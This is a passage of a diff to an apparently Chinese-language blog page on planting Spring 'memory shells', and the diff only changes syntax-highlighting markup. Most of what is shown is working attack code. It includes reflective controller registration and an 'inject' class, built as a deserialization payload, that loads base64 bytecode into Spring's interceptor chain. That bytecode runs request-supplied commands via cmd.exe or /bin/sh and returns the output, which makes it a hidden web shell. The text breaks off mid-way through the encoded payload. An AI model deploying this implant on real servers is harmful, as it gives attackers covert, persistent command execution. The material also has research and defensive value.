+</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">requestMappingHandlerMapping</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
@@ -956,22 +956,22 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyInterceptor</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;拦截器执行&#34;</span><span class="o">);</span>
-        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="s">&#34;/WEB-INF/pages/error.jsp&#34;</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span><span class="n">response</span><span class="o">);</span>
-        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-    <span class="o">}</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;控制器执行后执行&#34;</span><span class="o">);</span>
-    <span class="o">}</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;jsp页面执行后执行&#34;</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyInterceptor</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;拦截器执行&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="s">&#34;/WEB-INF/pages/error.jsp&#34;</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span><span class="n">response</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;控制器执行后执行&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;jsp页面执行后执行&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>再到xml文件中配置拦截路径和拦截器。</p>
 <div class="highlight"><div class="chroma">
@@ -986,15 +986,15 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;mvc:interceptors&gt;</span>
-    <span class="nt">&lt;mvc:interceptor&gt;</span>
-        <span class="c">&lt;!--            配置拦截器拦截路径--&gt;</span>
-        <span class="nt">&lt;mvc:mapping</span> <span class="na">path=</span><span class="s">&#34;/users/*&#34;</span><span class="nt">/&gt;</span>
-        <span class="c">&lt;!--            注入自定义拦截器--&gt;</span>
-        <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">&#34;com.example.spring.MyInterceptor&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;/mvc:interceptor&gt;</span>
-<span class="nt">&lt;/mvc:interceptors&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;mvc:interceptors&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;mvc:interceptor&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="c">&lt;!--            配置拦截器拦截路径--&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;mvc:mapping</span> <span class="na">path=</span><span class="s">&#34;/users/*&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="c">&lt;!--            注入自定义拦截器--&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">&#34;com.example.spring.MyInterceptor&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/mvc:interceptor&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/mvc:interceptors&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>下面跟一下拦截器的触发点
 <img src="/images/image-20211106230620.png" alt="">
@@ -1064,57 +1064,57 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.exaple.spring</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
-    <span class="kd">static</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
-<span class="c1">//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
-</span><span class="c1"></span>            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-
-            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="o">);</span>
-            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">adaptedInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstractHandlerMapping</span><span class="o">);</span>
-
-            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.magicInterceptor&#34;</span><span class="o">;</span>
-            <span class="c1">//加载com.example.spring.magicInterceptor类的字节码
-</span><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&#34;</span><span class="o">;</span> <span class="c1">// magicInterceptor类class的base64编码
-</span><span class="c1"></span>            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
-            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
-            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
-            <span class="c1">//添加com.example.spring.magicInterceptor类到adaptedInterceptors
-</span><span class="c1"></span>            <span class="n">adaptedInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
-
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
-
-    <span class="o">}</span>
-
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.exaple.spring</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">adaptedInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstractHandlerMapping</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.magicInterceptor&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//加载com.example.spring.magicInterceptor类的字节码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRX